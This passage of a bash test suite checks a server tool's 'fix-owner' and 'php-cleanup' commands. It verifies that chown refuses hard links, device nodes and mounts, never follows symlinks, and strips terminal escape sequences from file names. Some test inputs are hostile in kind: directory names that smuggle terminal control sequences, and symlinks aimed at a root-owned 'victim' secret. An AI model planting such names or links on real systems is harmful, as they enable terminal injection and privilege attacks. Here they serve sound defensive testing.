_fo_ids="$_fo_other"; : >"$_fo_calls"
OPT_DRY_RUN=1
assert_eq  "a dry run of a site that is all someone else's exits 0" 0 "$(_fo own.example.com)"
assert_has "and counts what a real run would change" "would hand ${_fo_all} files and directories to own_example_com:own_example_com" "$(cat "$_fo_out")"
OPT_DRY_RUN=0
assert_eq  "without starting chown" "" "$(cat "$_fo_calls")"

# the fake chown changes nothing, so what it was handed is still someone else's afterwards
assert_eq  "what is still someone else's after the run is an error" 1 "$(_fo own.example.com)"
assert_has "named as such" "own.example.com: not all of it changed hands (${_fo_all} of ${_fo_all} left)" "$(cat "$_fo_out")"
_fo_log="$(cat "$_fo_calls")"
assert_has   "chown changes links, never what they name, and takes no name for an option" "call -h -- own_example_com:own_example_com" "$_fo_log"
assert_has   "the home itself is handed over"      "${_fo_hp}"$'\n' "${_fo_log}"$'\n'
assert_has   "the document root"                   "${_fo_hp}/public_html"$'\n' "${_fo_log}"$'\n'
assert_has   "a file deep inside it"               "${_fo_hp}/public_html/wp-content/uploads/a.jpg" "$_fo_log"
assert_has   "private/"                            "${_fo_hp}/private/sessions" "$_fo_log"
assert_has   "the dot directories"                 "${_fo_hp}/.ssh" "$_fo_log"
assert_has   "and whatever was put in the home"    "${_fo_hp}/site.zip" "$_fo_log"
assert_lacks "but never logs"                      "${_fo_hp}/logs" "$_fo_log"
assert_lacks "nor the logs behind it"              "access.log" "$_fo_log"
assert_eq    "every name is handed over once"      "$_fo_all" "$(grep -vc '^call ' <<<"$_fo_log")"
assert_lacks "each one relative to the directory chown runs in" "PATH " "$_fo_log"

# a server an older release set up: logs/ is still a directory in the home, and must stay root's
if (( CAN_SYMLINK )); then
  rm -f "$_fo_h/logs"; mkdir -p "$_fo_h/logs"; printf 'log\n' >"$_fo_h/logs/access.log"
  : >"$_fo_calls"
  _fo "own.example.com" >/dev/null
  assert_lacks "logs/ as a directory is left alone as well" "${_fo_hp}/logs" "$(cat "$_fo_calls")"
  rm -rf "$_fo_h/logs"; ln -s "$_fo_ld" "$_fo_h/logs"
fi

# a file with a second name may have it outside the site - pnpm, cp -al - so the site is left
# as it is, and one moved into logs/ counts too: it could be moved back under a name the run
# is changing
CAN_HARDLINK=0
ln "$_fo_h/site.zip" "$TMP/.fo-linkprobe" 2>/dev/null && [[ "$(stat -c %h "$_fo_h/site.zip")" == 2 ]] && CAN_HARDLINK=1
rm -f "$TMP/.fo-linkprobe"
if (( CAN_HARDLINK )); then
  ln "$_fo_h/public_html/index.php" "$_fo_h/public_html/index-copy.php"
  : >"$_fo_calls"
  assert_eq    "a file with a second name stops the site" 1 "$(_fo own.example.com)"
  assert_has   "saying why" "never hands over a device node or a file with more than one name, and the site has 2 of them" "$(cat "$_fo_out")"
  assert_has   "and naming it" "public_html/index-copy.php" "$(cat "$_fo_out")"
  assert_eq    "before chown ever runs" "" "$(cat "$_fo_calls")"
  # and should one be moved into place after that look, the change itself passes it over
  : >"$_fo_calls"
  _domain_fix_owner_apply "$_fo_h" "$(( _fo_u + 1 ))" "$_fo_g" 2>/dev/null || true
  assert_has   "the change hands over the rest" "${_fo_hp}/public_html/wp-content" "$(cat "$_fo_calls")"
  assert_lacks "but not a file with a second name" "index-copy.php" "$(cat "$_fo_calls")"
  assert_lacks "nor its other name" "${_fo_hp}/public_html/index.php" "$(cat "$_fo_calls")"
  rm -f "$_fo_h/public_html/index-copy.php"
  if (( CAN_SYMLINK )); then
    rm -f "$_fo_h/logs"; mkdir -p "$_fo_h/logs"; printf 's' >"$_fo_h/logs/stash"; ln "$_fo_h/logs/stash" "$_fo_h/logs/stash2"
    : >"$_fo_calls"
    assert_eq  "a second name hidden in logs/ stops it too" 1 "$(_fo own.example.com)"
    assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
    rm -rf "$_fo_h/logs"; ln -s "$_fo_ld" "$_fo_h/logs"
  fi
  # the runner's own file with a second name belongs to the site already: nothing to look at
  _fo_ids="$_fo_mine"
  ln "$_fo_h/public_html/index.php" "$_fo_h/public_html/index-copy.php"
  assert_eq    "a second name on a file that is the site's already is no reason to stop" 0 "$(_fo own.example.com)"
  rm -f "$_fo_h/public_html/index-copy.php"
  _fo_ids="$_fo_other"
fi
if (( EUID == 0 )) && [[ "${OSTYPE:-}" != msys* && "${OSTYPE:-}" != cygwin* ]]; then
  mknod "$_fo_h/public_html/disk" b 7 0
  : >"$_fo_calls"
  assert_eq  "a device node stops the site" 1 "$(_fo own.example.com)"
  assert_has "and is named" "public_html/disk" "$(cat "$_fo_out")"
  assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
  rm -f "$_fo_h/public_html/disk"
fi

# something mounted inside the home: chown cannot tell its top from a directory
printf '36 25 8:1 / %s rw,relatime shared:1 - ext4 /dev/sdb1 rw\n' "$_fo_h/public_html/shared" >"$DOM_MOUNTINFO"
: >"$_fo_calls"
assert_eq  "a mount inside the home stops the site" 1 "$(_fo own.example.com)"
assert_has "naming it" "mounted inside the home, at ${_fo_h}/public_html/shared" "$(cat "$_fo_out")"
assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
printf '36 25 8:1 / %s rw - ext4 /dev/sdb1 rw\n36 25 8:1 / %s.old/x rw - ext4 /dev/sdb2 rw\n' "$_fo_h" "$_fo_h" >"$DOM_MOUNTINFO"
_fo_ids="$_fo_mine"
assert_eq  "the home as a mount of its own, or a neighbour's, is no reason" 0 "$(_fo own.example.com)"
: >"$DOM_MOUNTINFO"

# names come out of the site user's hands: no terminal control sequence reaches the screen
_fo_ids="$_fo_other"
if (( CAN_HARDLINK && CAN_SYMLINK )); then
  _fo_bad="$_fo_h/public_html/bad"$'\033'"]0;owned"$'\007'"name"
  mkdir -p "$_fo_bad"; ln "$_fo_h/site.zip" "$_fo_bad/görsel.zip"
  _fo own.example.com >/dev/null
  assert_lacks "an escape character in a name is not printed" $'\033' "$(cat "$_fo_out")"
  assert_has   "it is shown as a question mark, and a Turkish letter as itself" "bad?]0;owned?name/görsel.zip" "$(cat "$_fo_out")"
  rm -rf "$_fo_bad"
fi
# ... and none reaches the log through what chown says about it either
if (( CAN_SYMLINK )); then
  _fo_esc="$_fo_h/public_html/esc"$'\033'"[31mred"
  mkdir -p "$_fo_esc"
  _fo_ls="$(wc -c <"$LOG_FILE")"
  _fo own.example.com >/dev/null
  _fo_newlog="$(tail -c +"$(( _fo_ls + 1 ))" "$LOG_FILE")"
  assert_has   "what chown says goes to the log" "fake-chown -h -- own_example_com:own_example_com" "$_fo_newlog"
  assert_lacks "without a control character a name brought along" $'\033' "$_fo_newlog"
  rmdir "$_fo_esc"
fi

# --all: every registered site, on past one that fails, and an exit status that tells
lib_domain_state_reset
D_DOMAIN="own2.example.com"; D_IDENT="own2_example_com"; D_USER="own2_example_com"; D_GROUP="own2_example_com"
D_HOME="$SITES_ROOT/own2.example.com"; D_MODE="static"
lib_domain_state_save   # no home on disk
_fo_ids="$_fo_mine"
assert_eq  "--all with one site failing exits 1" 1 "$(_fo --all)"
assert_has "the others are still done" "own.example.com: everything already belongs to own_example_com" "$(cat "$_fo_out")"
assert_has "the failing one is named"  "own2.example.com: ${SITES_ROOT}/own2.example.com is not a directory; nothing changed" "$(cat "$_fo_out")"
assert_has "and counted"               "1 of 2 site(s) could not be handed over completely" "$(cat "$_fo_out")"
rm -rf "${STATE_DIR}/domains/own2.example.com"
assert_eq  "--all over sites that are all fine exits 0" 0 "$(_fo --all)"
STATE_DIR="$TMP/fo-none"
assert_eq  "--all without a site exits 0" 0 "$(_fo --all)"
assert_has "and says there is none" "No sites have been added yet." "$(cat "$_fo_out")"
STATE_DIR="$TMP/fo-state"

# The same, by itself: the pass the minute check runs over every site. It walks a home once to
# see whether anything there is somebody else's, and only then runs fix-owner's checks and its
# chown - quietly, saying once what it could not hand over and keeping the reason for doctor.
_fa() {   # -> the exit status; the output goes to $_fo_out
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  # no site's state is loaded when cron starts it: whose files they become has to come from the pass
  ( set -Eeuo pipefail; shopt -s lastpipe; OPT_QUIET=0; lib_domain_state_reset; lib_domain_fix_owner_auto ) >"$_fo_out" 2>&1
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}
_fa_doc() { lib_domain_state_load own.example.com; DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0; "$@"; printf '%s' "${DOC_RESULTS[*]-}"; }
_fa_stamp="$STATE_DIR/domains/own.example.com/fix-owner.auto"
_fa_orig_ri="$(declare -f lib_require_installed)"
eval 'lib_require_installed() { return 0; }'
assert_eq  "its reason for a refusal is kept in the site's state directory" "$_fa_stamp" "$(_domain_fix_owner_stamp own.example.com)"
assert_true "it is on unless somebody switched it off" lib_domain_fix_owner_auto_enabled
_fo_ids="$_fo_mine"; : >"$_fo_calls"
assert_eq  "a pass over a site whose files are all its own exits 0" 0 "$(_fa)"
assert_eq  "says nothing, starts no chown and keeps no reason" "" "$(cat "$_fo_out")$(cat "$_fo_calls")$(cat "$_fa_stamp" 2>/dev/null || true)"
_fo_ids="$_fo_other"; : >"$_fo_calls"
assert_eq  "a pass over a site that holds somebody else's files exits 0" 0 "$(_fa)"
assert_has "it starts the chown fix-owner starts" "call -h -- own_example_com:own_example_com" "$(cat "$_fo_calls")"
assert_lacks "and leaves logs/ out as fix-owner does" "${_fo_hp}/logs" "$(cat "$_fo_calls")"
# the fake chown changes nothing, so nothing changed hands
assert_has "what could not be handed over is said" "own.example.com: what is not own_example_com's in ${_fo_h} is not handed over by itself: ${_fo_all} files and directories did not change hands" "$(cat "$_fo_out")"
assert_has "with the command that shows it" "(setup.sh fix-owner own.example.com shows it)" "$(cat "$_fo_out")"
assert_has "and the reason is kept" "${_fo_all} files and directories did not change hands" "$(cat "$_fa_stamp" 2>/dev/null || true)"
: >"$_fo_calls"
assert_eq  "the next pass tries again" 0 "$(_fa)"
assert_has "(the chown is started again)" "call -h -- own_example_com:own_example_com" "$(cat "$_fo_calls")"
assert_eq  "and does not say the same thing a second time" "" "$(cat "$_fo_out")"
assert_has "doctor reads the reason" "WARN|site own.example.com: ownership|what is not own_example_com's in " "$(_fa_doc _doc_site_fix_owner own.example.com)"
assert_has "all of it" "is not handed over by itself: ${_fo_all} files and directories did not change hands" "$(_fa_doc _doc_site_fix_owner own.example.com)"
if (( CAN_HARDLINK )); then
  ln "$_fo_h/public_html/index.php" "$_fo_h/public_html/index-copy.php"; : >"$_fo_calls"
  assert_eq  "a file with a second name: the pass exits 0" 0 "$(_fa)"
  assert_has "it stops the whole site, as it stops fix-owner" "a device node or a file with more than one name is never handed over, and the site has 2 of them" "$(cat "$_fo_out")"
  assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
  assert_has "the new reason takes the place of the old one" "a file with more than one name is never handed over" "$(cat "$_fa_stamp")"
  rm -f "$_fo_h/public_html/index-copy.php"
fi
printf '36 25 8:1 / %s rw,relatime shared:1 - ext4 /dev/sdb1 rw\n' "$_fo_h/public_html/shared" >"$DOM_MOUNTINFO"; : >"$_fo_calls"
assert_eq  "a mount inside the home: the pass exits 0" 0 "$(_fa)"
assert_has "it stops the site too" "a filesystem is mounted inside the home" "$(cat "$_fo_out")"
assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
: >"$DOM_MOUNTINFO"
_fo_ids="$_fo_mine"
assert_eq  "once nothing is somebody else's any more" 0 "$(_fa)"
assert_false "the reason goes" test -e "$_fa_stamp"
assert_eq  "and doctor has nothing to say" "" "$(_fa_doc _doc_site_fix_owner own.example.com)"
# what keeps it from running at all
_fo_ids="$_fo_other"; : >"$_fo_calls"
OPT_DRY_RUN=1
assert_eq  "a dry run hands nothing over" "0" "$(_fa)$(cat "$_fo_calls")"
OPT_DRY_RUN=0
printf '0\n' >"$DOM_HARDLINKS_SYSCTL"
assert_eq  "nor does a pass on a server without protected hard links" "0" "$(_fa)$(cat "$_fo_calls")"
assert_has "which doctor names" "WARN|ownership|files root uploads into a site are not handed over: fs.protected_hardlinks is off" "$(_fa_doc _doc_check_fix_owner_auto)"
printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
if (( CAN_SYMLINK )); then
  mv "$_fo_h" "$TMP/fo-home-aside"; ln -s "$TMP/fo-home-aside" "$_fo_h"
  assert_eq  "a home that is a link is passed over" "0" "$(_fa)$(cat "$_fo_calls")"
  rm -f "$_fo_h"; mv "$TMP/fo-home-aside" "$_fo_h"
fi
# the switch
assert_eq  "--auto wants on or off"              1 "$(_fo --auto)"
assert_eq  "and nothing else"                    1 "$(_fo --auto maybe)"
assert_eq  "and no site: it is for all of them" 1 "$(_fo --auto off own.example.com)"
assert_true "none of which switched anything"    lib_domain_fix_owner_auto_enabled
assert_eq  "fix-owner --auto off exits 0"        0 "$(_fo --auto off)"
assert_false "and switches it off"               lib_domain_fix_owner_auto_enabled
: >"$_fo_calls"
assert_eq  "a pass then hands nothing over"      "0" "$(_fa)$(cat "$_fo_calls")"
assert_has "doctor says that it is off, without a warning" "OK|ownership|files root uploads into a site stay root's until fix-owner is run" "$(_fa_doc _doc_check_fix_owner_auto)"
assert_eq  "fix-owner itself still runs"         1 "$(_fo own.example.com)"
assert_has "(its chown is started)"              "call -h -- own_example_com:own_example_com" "$(cat "$_fo_calls")"
OPT_DRY_RUN=1
assert_eq  "a dry run of the switch exits 0"     0 "$(_fo --auto on)"
OPT_DRY_RUN=0
assert_has "says what it would do"               "[dry-run] would switch the automatic hand-over on" "$(cat "$_fo_out")"
assert_lacks "and not that it did"               "is handed to its user by itself" "$(cat "$_fo_out")"
assert_false "and switches nothing"              lib_domain_fix_owner_auto_enabled
lib_cron_remove htaccess
assert_eq  "--auto on exits 0"                   0 "$(_fo --auto on)"
assert_true "and switches it on again"           lib_domain_fix_owner_auto_enabled
assert_has "making sure the minute check is scheduled" "htaccess-check --quiet # server-setup:htaccess" "$(cat "$CRON_FILE")"
assert_has "doctor says what happens then"       "OK|ownership|what root uploads into a site is the site user's within a minute" "$(_fa_doc _doc_check_fix_owner_auto)"
# the minute check runs it, before it closes a wp-config.php, and not while another command
# holds the lock
assert_true "the minute check hands over before it closes a wp-config.php" \
  bash -c '[[ "$1" == *lib_domain_fix_owner_auto*lib_domain_wp_config_close* ]]' _ "$(declare -f lib_ols_htaccess_check_main)"
: >"$_fo_calls"
( eval 'flock() { return 1; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
assert_eq  "it hands nothing over while another command holds the lock" "" "$(cat "$_fo_calls")"
( eval 'flock() { return 0; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
assert_has "and does otherwise"                  "call -h -- own_example_com:own_example_com" "$(cat "$_fo_calls")"
assert_has "the usage names the switch"          "setup.sh fix-owner --auto on|off" "$(lib_domain_fix_owner_usage)"
assert_has "and so does the command reference"   "fix-owner --auto on|off" "$(lib_usage)"
assert_has "update says what the minute check does to uploads" 'lib_domain_fix_owner_auto_enabled' "$(declare -f lib_install_migrate)"
assert_has "doctor looks for a kept reason in every site" '_doc_site_fix_owner "$d"' "$(declare -f _doc_check_domains)"
assert_has "and says once whether uploads are handed over at all" '_doc_check_fix_owner_auto' "$(declare -f lib_doctor_run)"
_fo_ids="$_fo_mine"; _fa >/dev/null
eval "$_fa_orig_ri"
_fo_ids="$_fo_other"

# the account behind the numbers: it has to be this site's, and never root
eval "$_fo_orig_ids"
if command -v getent >/dev/null 2>&1 && getent passwd root >/dev/null 2>&1; then
  D_USER="nosuch_fo_account"; D_GROUP="nosuch_fo_account"
  assert_has "an account that is gone is named" "its user nosuch_fo_account does not exist" "$(_domain_fix_owner_ids /home/x || true)"
  D_USER="root"; D_GROUP="root"
  assert_has "root is never a site's account" "is not a site account" "$(_domain_fix_owner_ids "$(getent passwd root | cut -d: -f6)" || true)"
  if (( EUID != 0 )); then
    D_USER="$(id -un)"; D_GROUP="$(id -gn)"
    assert_has "an account with another home is refused" "the home of ${D_USER} is" "$(_domain_fix_owner_ids /home/elsewhere.example.com || true)"
    assert_eq  "the account of this home gives its numbers" "$(id -u) $(id -g)" \
      "$(_domain_fix_owner_ids "$(getent passwd "$D_USER" | cut -d: -f6)" || true)"
  fi
fi

# as root, for real: the files change hands, links are changed and never followed, and what
# they lead to - a file root keeps outside the site - stays root's
if (( EUID == 0 )) && [[ "${OSTYPE:-}" != msys* && "${OSTYPE:-}" != cygwin* ]] && id -u nobody >/dev/null 2>&1; then
  eval '_domain_fix_owner_ids() { printf "%s" "$_fo_ids"; }'
  DOM_FIX_OWNER_PATH="/usr/sbin:/usr/bin:/sbin:/bin"
  lib_domain_state_reset
  D_DOMAIN="real.example.com"; D_IDENT="real_example_com"; D_USER="nobody"; D_GROUP="$(id -gn nobody)"
  D_HOME="$SITES_ROOT/real.example.com"; D_MODE="php"
  lib_domain_state_save
  _fo_r="$SITES_ROOT/real.example.com"; _fo_v="$TMP/fo-victim"
  mkdir -p "$_fo_r/public_html/deep/er" "$_fo_r/logs" "$_fo_v/dir"
  printf 'secret' >"$_fo_v/secret"; printf 'inner' >"$_fo_v/dir/inner"; printf 'x' >"$_fo_r/public_html/deep/er/page.html"
  printf 'log' >"$_fo_r/logs/error.log"
  ln -s "$_fo_v/secret" "$_fo_r/secret-link"
  ln -s "$_fo_v/dir" "$_fo_r/public_html/deep/dir-link"
  ln -s "$_fo_v/secret" "$_fo_r/public_html/deep/er/file-link"
  _fo_ids="$(id -u nobody) $(id -g nobody)"
  assert_eq  "a real run exits 0" 0 "$(_fo real.example.com)"
  assert_has "and reports what it handed over" "files and directories handed to nobody:" "$(cat "$_fo_out")"
  printf 'r' >"$_fo_r/public_html/one-more.txt"
  assert_eq  "one more upload" 0 "$(_fo real.example.com)"
  assert_has "is one file, in the singular" "real.example.com: 1 file or directory handed to nobody:" "$(cat "$_fo_out")"
  assert_eq  "nothing in the home but logs/ is root's any more" "" \
    "$(find "$_fo_r" -path "$_fo_r/logs" -prune -o -uid 0 -print)"
  assert_eq  "the links themselves changed hands" "$(id -u nobody)" "$(stat -c %u "$_fo_r/public_html/deep/dir-link")"
  assert_eq  "logs/ stays root's"                "0 0" "$(stat -c '%u %g' "$_fo_r/logs")"
  assert_eq  "and so does what is in it"         "0" "$(stat -c %u "$_fo_r/logs/error.log")"
  assert_eq  "a file a link led to stays root's" "0 0" "$(stat -c '%u %g' "$_fo_v/secret")"
  assert_eq  "a directory a link led to too"     "0 0 0" "$(stat -c '%u %g' "$_fo_v/dir") $(stat -c %u "$_fo_v/dir/inner")"
  assert_eq  "a second run has nothing to do" 0 "$(_fo real.example.com)"
  assert_has "and says so" "real.example.com: everything already belongs to nobody" "$(cat "$_fo_out")"
  # ... and by itself: a new upload as root, its wp-config.php with it
  mkdir -p "$_fo_r/public_html/up"; printf 'u' >"$_fo_r/public_html/up/new.php"
  assert_eq  "by itself: a pass exits 0" 0 "$(_fa)"
  assert_has "and says what it handed over" "real.example.com: 2 files and directories handed to nobody:" "$(cat "$_fo_out")"
  assert_eq  "nothing in the home but logs/ is root's after it" "" "$(find "$_fo_r" -path "$_fo_r/logs" -prune -o -uid 0 -print)"
  assert_eq  "logs/ still is" "0 0" "$(stat -c '%u %g' "$_fo_r/logs")"
  printf '<?php // uploaded as root\n' >"$_fo_r/public_html/wp-config.php"; chmod 0644 "$_fo_r/public_html/wp-config.php"
  ( eval 'flock() { return 0; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
  assert_eq  "one pass of the minute check hands an uploaded wp-config.php over and closes it" "640 nobody" "$(stat -c '%a %U' "$_fo_r/public_html/wp-config.php")"
  rm -rf "$_fo_r" "$_fo_v" "${STATE_DIR}/domains/real.example.com"
fi

# the menu: item 21, every site unless one is picked
_mfo() {   # [answer] -> the command the menu runs
  (
    eval '_menu_ask() { local -n _o="$1"; _o="${_mfa:-${3:-}}"; }
          _menu_run() { printf "%s\n" "$*"; }
          _menu_pick_domain() { printf "picked.example.com"; }
          _menu_pause() { :; }'
    _mfa="${1:-}"
    _menu_fix_owner 2>/dev/null | tail -n 1
  )
}
assert_eq  "the menu hands over every site by default" "fix-owner --all" "$(_mfo)"
assert_eq  "or the one picked"                         "fix-owner picked.example.com" "$(_mfo 2)"
assert_eq  "the third choice stops the automatic hand-over" "fix-owner --auto off" "$(_mfo 3)"
lib_manifest_set '.fix_owner_auto' off
assert_eq  "or starts it again when it is off"         "fix-owner --auto on" "$(_mfo 3)"
lib_manifest_set '.fix_owner_auto' on
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
assert_has "it is item 21 of the main menu"   '_menu_item 21 "Fix file ownership (after uploading as root)"' "$_menu_block"
assert_has "which opens it"                   '21) _menu_fix_owner ;;' "$_menu_block"
assert_has "the command is dispatched"        'fix-owner)      lib_domain_fix_owner_main "${rest[@]}" || exit 1 ;;' "$(cat "$ROOT/setup.sh")"
assert_has "and in the command reference"     "fix-owner <domain>|--all" "$(lib_usage)"
assert_has "a new site's summary points at it" 'setup.sh fix-owner ${D_DOMAIN}' "$(declare -f lib_domain_summary)"
if [[ -e /proc/sys/fs/protected_hardlinks ]]; then
  assert_has "lomp's sysctl file keeps hard links protected" "fs.protected_hardlinks = 1" "$(lib_system_render_sysctl)"
  assert_has "and links in sticky directories"              "fs.protected_symlinks = 1" "$(lib_system_render_sysctl)"
fi

eval "$_fo_saved"; eval "$_fo_orig_ids"; eval "$_fo_orig_rt"
unset -f _fa _fa_doc
rm -rf "$_fo_h" "$_fo_ld"
lib_domain_state_reset

# =============================================================================
section "php-cleanup: what 'apt-get install lsphp83*' added goes, and nothing else"
# The wildcard brings a compiler, debug symbols, the module sources and the distribution's own
# PHP. apt's history names what that one run installed; only that is ever a candidate.
_pc="$TMP/phpclean"; mkdir -p "$_pc"
_pc_saved="$(declare -f lib_pkg_installed lib_php_cli lib_run lib_php_restart_workers lib_php_ensure_extensions lib_php_installed_versions lib_php_installed lib_require_tools lib_require_installed)"
_pc_hist="$PHP_APT_HISTORY"; PHP_APT_HISTORY="$_pc/history.log"
cat >"$PHP_APT_HISTORY" <<'EOF'

Start-Date: 2026-09-20  10:00:00
Commandline: apt-get install -y -q --no-install-recommends lsphp83 lsphp83-common
Install: lsphp83:amd64 (8.3.33-1+noble), lsphp83-common:amd64 (8.3.33-1+noble)
End-Date: 2026-09-20  10:00:09

Start-Date: 2026-09-27  21:14:02
Commandline: apt-get install lsphp83*
Requested-By: someone (1000)
Install: lsphp83-dev:amd64 (8.3.33-1+noble), gcc:amd64 (4:13.2.0-7ubuntu1, automatic), lsphp83-sqlite3:amd64 (8.3.33-1+noble), lsphp83-ioncube:amd64 (14.0-1), php8.3-cli:amd64 (8.3.6-0ubuntu0.24.04.5, automatic), libtool:amd64 (2.4.7-7build1, automatic), gdb:amd64 (15.0, automatic), lsphp83-igbinary:amd64 (3.2-1)
End-Date: 2026-09-27  21:15:40

Start-Date: 2026-09-28  09:00:00
Commandline: apt-get install htop lsphp83-ldap
Install: htop:amd64 (3.3.0-4build1), lsphp83-ldap:amd64 (8.3.33-1+noble)
End-Date: 2026-09-28  09:00:03
EOF
printf '\nStart-Date: 2026-08-01  08:00:00\nCommandline: apt install lsphp83* -y\nInstall: lsphp83-dbg:amd64 (8.3.30-1+noble)\nEnd-Date: 2026-08-01  08:01:00\n' | gzip -c >"$PHP_APT_HISTORY.2.gz"
assert_eq "the wildcard runs' packages are read from the history, rotated copies too" \
  "gcc gdb libtool lsphp83-dbg lsphp83-dev lsphp83-igbinary lsphp83-ioncube lsphp83-sqlite3 php8.3-cli" \
  "$(_php_wildcard_added lsphp83 | paste -sd' ' -)"
assert_eq "another version's wildcard is not this one's" "" "$(_php_wildcard_added lsphp84)"
# gdb was removed since; everything else is installed
: >"$_pc/calls"; : >"$_pc/needs"; : >"$_pc/autogone"
printf '%s\n' gcc libtool php8.3-cli >"$_pc/auto"
eval 'lib_pkg_installed() { [[ "$1" != "gdb" ]]; }
      apt-mark() { cat "$_pc/auto"; }
      apt-get() {   # -s purge: the arguments and what "needs" says they drag along; the autoremove
        local a="" sim=0 mode="" out=()   # simulation: "autogone"; --assume-no: the size line
        for a in "$@"; do
          case "$a" in
            -s) sim=1 ;; purge|autoremove) [[ -n "$mode" ]] || mode="$a" ;;
            --assume-no) printf "After this operation, 484 MB disk space will be freed.\n"; return 1 ;;
            -*|APT::*) ;;
            *) out+=("$a") ;;
          esac
        done
        (( sim )) || return 0
        if [[ " $* " == *" --autoremove "* || "$mode" == "autoremove" ]]; then sed "s/^/Purg /; s/\$/ [1]/" "$_pc/autogone"; return 0; fi
        for a in "${out[@]}"; do printf "Purg %s [1]\n" "$a"; awk -F: -v p="$a" "\$1 == p { print \"Purg \" \$2 \" [1]\" }" "$_pc/needs"; done
      }
      lib_php_cli() { printf "%s/php" "$_pc"; }
      lib_run() { printf "%s\n" "$*" >>"$_pc/calls"; }
      lib_php_restart_workers() { printf "restart\n" >>"$_pc/calls"; }
      lib_php_ensure_extensions() { :; }
      lib_php_installed_versions() { printf "8.3\n"; }
      lib_php_installed() { return 0; }
      lib_require_tools() { :; }; lib_require_installed() { :; }'
printf '#!/usr/bin/env bash\nprintf ok\n' >"$_pc/php"; chmod +x "$_pc/php"
assert_eq "what lomp installs itself is no candidate, nor what is gone already" \
  "gcc libtool lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "$(lib_php_cleanup_candidates 8.3 | paste -sd' ' -)"
assert_has "doctor counts what php-cleanup would purge, not what it keeps" 'extra="${#PHP_CLEAN_REMOVE[@]}"' "$(declare -f _doc_check_domains)"
lib_php_cleanup_plan 8.3
assert_eq "all of it goes when nothing else comes along" \
  "gcc libtool lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "${PHP_CLEAN_REMOVE[*]}"
assert_eq "the extension packages among them are named" "lsphp83-dbg lsphp83-dev lsphp83-ioncube" "${PHP_CLEAN_EXTS[*]}"
assert_eq "nothing is held" "" "${PHP_CLEAN_HELD[*]-}${PHP_CLEAN_MANUAL[*]-}${PHP_CLEAN_EXTRA}"
# gcc marked as manually installed since: it stays
printf '%s\n' libtool php8.3-cli >"$_pc/auto"
lib_php_cleanup_plan 8.3
assert_eq    "a package marked manual since is kept" "gcc" "${PHP_CLEAN_MANUAL[*]}"
assert_lacks "and not purged"                        " gcc " " ${PHP_CLEAN_REMOVE[*]} "
printf '%s\n' gcc libtool php8.3-cli >"$_pc/auto"
# something installed since needs libtool: apt says what nothing needs, and libtool stays
printf 'libtool:autoconf-archive\n' >"$_pc/needs"
printf '%s\n' gcc lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli >"$_pc/autogone"
lib_php_cleanup_plan 8.3
assert_eq "what something that stays needs is held"  "libtool" "${PHP_CLEAN_HELD[*]}"
assert_eq "and what it is that needs it is named"     "autoconf-archive" "$PHP_CLEAN_BLOCKERS"
assert_eq "the rest still goes" "gcc lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "${PHP_CLEAN_REMOVE[*]}"
assert_eq "with nothing dragged along"               "" "$PHP_CLEAN_EXTRA"
# a list that would still take a foreign package with it: stop, change nothing
printf 'libtool:autoconf-archive\ngcc:build-essential\n' >"$_pc/needs"
_out="$(OPT_QUIET=0; OPT_YES=1; rc=0; lib_php_cleanup_main >"$_pc/out" 2>&1 || rc=$?; cat "$_pc/out"; printf 'rc=%s' "$rc")"
assert_has "a purge that would take a foreign package along stops" "apt would also remove packages that 'lsphp83*' did not install: build-essential" "$_out"
assert_has "with a failing status" "rc=1" "$_out"
assert_eq  "and nothing purged"    "" "$(cat "$_pc/calls")"
: >"$_pc/needs"; : >"$_pc/autogone"
# a dry run and a "no" change nothing
_out="$(OPT_QUIET=0; OPT_DRY_RUN=1; lib_php_cleanup_main 2>&1)"
assert_has "a dry run lists the packages" "lsphp83-dev" "$_out"
assert_has "the space they take"          "484 MB disk space will be freed" "$_out"
assert_has "warns about the extensions"   "which every site stops loading: lsphp83-dbg lsphp83-dev lsphp83-ioncube" "$_out"
assert_eq  "and purges nothing"           "" "$(cat "$_pc/calls")"
_out="$(OPT_QUIET=0; OPT_YES=0; OPT_NON_INTERACTIVE=1; lib_php_cleanup_main 2>&1 </dev/null)"
assert_has "unanswered, the default is no" "Nothing changed." "$_out"
assert_eq  "and nothing is purged"         "" "$(cat "$_pc/calls")"
_out="$(OPT_QUIET=0; OPT_YES=1; lib_php_cleanup_main 2>&1)"
assert_has "with --yes the list is purged, exactly" \
  "apt-get purge -y -q gcc libtool lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "$(head -n 1 "$_pc/calls")"
assert_has "PHP is started once to see that it still does" "PHP starts cleanly" "$_out"
assert_has "the workers are restarted to drop the old set" "restart" "$(cat "$_pc/calls")"
: >"$_pc/calls"
eval 'lib_pkg_installed() { case "$1" in gdb|gcc|libtool|lsphp83-dbg|lsphp83-dev|lsphp83-ioncube|php8.3-cli) return 1 ;; esac; return 0; }'
_out="$(OPT_QUIET=0; OPT_YES=1; lib_php_cleanup_main 2>&1)"
assert_has "a second run finds nothing to remove" "nothing to remove" "$_out"
assert_eq  "and runs nothing"                     "" "$(cat "$_pc/calls")"
rm -f "$PHP_APT_HISTORY" "$PHP_APT_HISTORY.2.gz"
_out="$(OPT_QUIET=0; OPT_YES=1; lib_php_cleanup_main 2>&1)"
assert_has "a server that never ran the wildcard has nothing to undo" "nothing to undo" "$_out"
